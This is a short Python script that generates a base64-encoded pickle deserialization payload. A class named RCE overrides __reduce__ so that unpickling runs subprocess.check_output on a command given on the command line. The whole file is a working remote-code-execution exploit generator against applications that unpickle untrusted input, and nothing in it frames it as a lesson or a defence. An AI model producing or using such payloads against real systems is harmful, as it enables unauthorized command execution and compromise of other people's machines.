import pickle
import base64
import subprocess
import argparse
import shlex

class RCE:
    def __init__(self, cmd: str) -> None:
        self.cmd = cmd

    def __reduce__(self) -> subprocess.check_output:
        return subprocess.check_output, (shlex.split(self.cmd),)

def main():
    parser = argparse.ArgumentParser(description="create a pickle subprocess.check_output payload.")
    parser.add_argument("--cmd", required=True, help="cmd")

    args = parser.parse_args()

    payload = base64.b64encode(pickle.dumps(RCE(args.cmd)))
    print(payload.decode())

if __name__ == "__main__":
    main()
